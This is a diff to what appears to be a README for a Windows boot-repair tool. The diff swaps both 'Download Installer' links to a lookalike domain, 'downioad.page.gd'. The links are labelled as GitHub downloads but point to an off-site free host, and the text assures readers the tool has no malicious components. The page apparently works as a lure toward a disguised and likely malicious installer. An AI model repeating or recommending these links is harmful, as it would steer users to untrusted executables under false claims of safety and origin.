@@ -2,7 +2,7 @@
 
 This tool is designed to help users fix automatic repair loops that can occur on Windows 10 and 11 systems. With Windows Automatic Repair Fix 2026, you can easily diagnose and repair common boot issues without needing advanced technical knowledge.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -54,7 +54,7 @@ No, basic repair functions can be performed offline, but an internet connection 
 
 For the latest version of Windows Automatic Repair Fix, download it directly from the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Ensure that you always download from trusted sources to avoid any security risks. The tool is free and does not contain any malicious components, making it safe for everyday use on Windows systems.
 
